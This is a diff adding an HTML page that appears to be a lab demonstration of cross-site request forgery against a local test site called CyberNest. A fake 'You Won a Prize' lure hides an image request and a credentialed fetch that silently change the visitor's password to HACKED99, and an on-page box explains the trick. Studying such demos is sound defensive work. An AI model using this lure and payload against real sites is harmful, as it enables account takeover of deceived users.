@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>You Won a Prize!</title>
+  <style>
+    body { font-family: Arial; text-align: center; padding: 50px; background: #1a1a2e; color: white; }
+    .btn { padding: 16px 32px; background: #e74c3c; color: white; border: none; border-radius: 10px; font-size: 18px; cursor: pointer; }
+    .status { margin-top: 20px; font-size: 14px; color: #aaa; }
+    .info { margin-top: 30px; background: #2a2a4e; padding: 20px; border-radius: 10px; text-align: left; font-size: 13px; color: #ccc; }
+  </style>
+</head>
+<body>
+  <h1>🎉 You Won a Free Security Camera!</h1>
+  <p>Click below to claim your prize from CyberNest!</p>
+
+  <!-- HIDDEN ATTACK — victim cannot see this -->
+  <img src="http://localhost:5000/change-password?new_password=HACKED99"
+       style="display:none"
+       onload="document.getElementById('status').innerText='✅ Prize claimed successfully!'"
+       onerror="document.getElementById('status').innerText='✅ Prize claimed successfully!'"/>
+
+  <button class="btn" onclick="attack()">🎁 Claim My Prize!</button>
+  <div class="status" id="status">Click button to claim...</div>
+
+  <div class="info">
+    <strong style="color:#e74c3c;">What is secretly happening:</strong><br/><br/>
+    While you see a prize page — a hidden request is being sent to CyberNest to change your password to <strong>HACKED99</strong>.<br/><br/>
+    The site has no CSRF protection so it accepts this request!
+  </div>
+
+  <script>
+    function attack() {
+      document.getElementById('status').innerText = 'Processing your prize...';
+      fetch('http://localhost:5000/change-password?new_password=HACKED99', {
+        method: 'GET',
+        credentials: 'include',
+        mode: 'no-cors'
+      }).then(() => {
+        document.getElementById('status').innerText = '✅ Prize claimed! (Password silently changed to HACKED99)';
+      }).catch(() => {
+        document.getElementById('status').innerText = '✅ Request sent! Check if password changed.';
+      });
+    }
+  </script>
+</body>
+</html>
